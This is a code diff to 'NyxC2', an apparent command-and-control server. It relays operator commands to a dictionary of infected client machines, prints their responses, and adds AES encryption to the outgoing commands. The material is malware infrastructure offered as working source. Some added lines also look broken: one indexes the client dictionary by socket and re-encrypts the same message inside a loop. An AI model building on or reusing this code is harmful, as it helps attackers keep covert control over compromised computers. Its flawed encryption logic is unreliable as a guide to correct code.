@@ -120,6 +120,7 @@ def server():
 
                 else:
                     # Forward normal input using the format "<target|*> <command>".
+                    
                     send_message(command, dict_ip)
                 print("NyxC2 > ", end="", flush=True)
 
@@ -172,7 +173,8 @@ def server():
                                         dict_ip[nom_cible][2], ciphertext
                                     )
                                     new_data = plaintext.decode("cp850", errors="replace").strip()
-                                    print(f"[answer from {nom_cible}] : {new_data}")
+                                    if new_data != "empty":
+                                        print(f"[answer from {nom_cible}] : {new_data}")
 
                             print("ciphertext\n" + str(ciphertext))
 
@@ -222,6 +224,7 @@ def send_message(message, infected_dict):
         # to the other clients.
         for name, socket_client in infected_dict.items():
             try:
+                final_mess = aes_encrypt(infected_dict[socket_client][2], final_mess)
                 socket_client.send(header + final_mess.encode("utf-8"))
             except Exception:
                 pass
@@ -230,6 +233,7 @@ def send_message(message, infected_dict):
             # Send the length header followed by the exact command payload
             # expected by the client's receive loop.
             try:
+                final_mess = aes_encrypt(infected_dict[target][2], final_mess)
                 infected_dict[target][0].send(header + final_mess.encode("utf-8"))
             except Exception as e:
                 print(f"[!] Erreur d'envoi à {target}")
